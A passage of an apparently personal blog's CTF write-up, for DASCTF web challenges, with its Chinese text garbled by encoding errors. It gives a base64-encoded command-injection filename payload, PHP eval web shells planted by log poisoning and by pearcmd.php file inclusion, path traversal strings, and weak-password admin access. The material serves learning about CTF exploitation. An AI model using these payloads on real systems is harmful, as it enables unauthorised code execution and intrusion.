class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡å·²åˆ é™¤!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span></span><br><span class="line"><span class="language-php">          &#125;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>åˆ†ææºç </p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœä¸å­˜åœ¨session[<span class="string">&#x27;user&#x27;</span>]ï¼Œå‡ºç°ç™»å½•è¡¨å•ï¼Œæäº¤è¡¨å•ä¹‹åå°±ä¼šç»™session[<span class="string">&#x27;user&#x27;</span>]è¿›è¡Œèµ‹å€¼ã€‚</span><br><span class="line">ç¬¬ä¸€æ¬¡ç™»å½•åå†å›åˆ°åŸè¡¨å•å°±ä¼šè§¦å‘jsæç¤ºä¸æ˜¯<span class="literal">admin</span>ï¼Œå¹¶è·å¾—æºç æ–‡ä»¶çš„ä½ç½®ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªif</span><br><span class="line"></span><br><span class="line">å¦‚æœä¸å­˜åœ¨<span class="keyword">file</span>ï¼Œé‚£å°±è§¦å‘æ–‡ä»¶ä¸Šä¼ è¡¨å•ï¼Œactionä¸ºindex.phpï¼Œå¦‚æœå­˜åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯¹æ–‡ä»¶åç¼€è¿›è¡Œåˆ¤æ–­å¹¶è¿”å›ä¸Šä¼ æˆåŠŸæç¤º</span><br><span class="line">å¦‚æœå­˜åœ¨<span class="keyword">file</span>ï¼Œé‚£ä¹ˆå°±å°†æ–‡ä»¶åèµ‹å€¼ç»™<span class="variable">$filename</span>ï¼Œç„¶åå¼•ç”¨<span class="keyword">FILE</span>ç±»å¯¹æ–‡ä»¶åè¿›è¡Œå¤„ç†ï¼Œconstructä¸»è¦æ˜¯è¿‡æ»¤äº†/å’Œå¤šä¸ª.ï¼Œä¸”åˆ¤æ–­äº†æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œ<span class="params">system</span>å‡½æ•°</span><br></pre></td></tr></table></figure><p>å…·ä½“æ“ä½œ<img src="../ç¬”è®°å›¾/image-20230722205634843.png" alt=""></p><p><img src="../ç¬”è®°å›¾/image-20230722205650142.png" alt="image-20230722205650142"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://2f3204e1-d884-4172-86aa-0ac751e580de.node4.buuoj.cn:81/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>ç”¨æˆ·åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>å¯†ç ï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å†™è¡¨å•è¿›è¡Œç™»å½•å’Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ æ–‡ä»¶ä¹‹åå†ç”¨å¦ä¸€ä¸ªç•Œé¢è¿›è¡Œ<span class="built_in">get</span>ä¼ <span class="built_in">file</span>ï¼Œä¼ å…¥çš„<span class="built_in">file</span>åå¿…é¡»å’Œä¸Šä¼ çš„æ–‡ä»¶åæ˜¯ä¸€æ ·çš„ï¼Œè¿›è€Œè§¦å‘<span class="keyword">system</span>å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line">ç”±äºå¯¹/å’Œ.å…·æœ‰ä¸¥æ ¼è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨ç¼–ç ç»•è¿‡</span><br><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br><span class="line">bpä¼ å‚éœ€è¦æŠŠç©ºæ ¼æ”¹ä¸º+å·</span><br></pre></td></tr></table></figure><h2 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœ‹åˆ°æ˜¯ä¸ªç½‘é¡µç›´æ¥ç›²çŒœä¸€æ‰‹åå°ç®¡ç†ç•Œé¢/adminï¼Œç„¶åå¼±å£ä»¤è¯•äº†ä¸€ä¸‹å°±è¿›å»äº†</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20230722211756542.png" alt="image-20230722211756542"></p><p>è¿™é‡Œæ˜¯æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œbutå¥½åƒæ²¡ä»€ä¹ˆåµç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åå°±æƒ³æ˜¯å¦å¯ä»¥è¿›è¡Œæ—¥å¿—åŒ…å«</span><br><span class="line">æ·»åŠ UAï¼š<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chuling]); <span class="meta">?&gt;</span></span><br><span class="line">ç„¶åè®¿é—®url:   url/admin/r=../../../../../../<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">ç”¨èšå‰‘å°è¯•è¿æ¥ï¼Œç»“æœå¤±è´¥äº†ã€‚</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™å°±åˆæ¥äº†ä¸€ä¸ªpearcmd.phpæ–‡ä»¶åŒ…å«</p><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">https://blog.csdn.net/Mrs_H/article/details/122386511</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å…·ä½“æ“ä½œä¸º?+config-create+<span class="regexp">/&amp;r=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/share/</span>php<span class="regexp">/pearcmd&amp;/</span>&lt;?=eval(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>chuling2.php</span><br><span class="line"></span><br><span class="line">æˆåŠŸä¹‹åç›´æ¥èšå‰‘è¿æ¥å¾—åˆ°flag</span><br></pre></td></tr></table></figure><p><img src="../ç¬”è®°å›¾/image-20230722214619617.png" alt="image-20230722214619617"></p>]]></content>
    
    
    <summary type="html">DASCTF wpæ¥å’¯~ web 3/5</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
</feed>
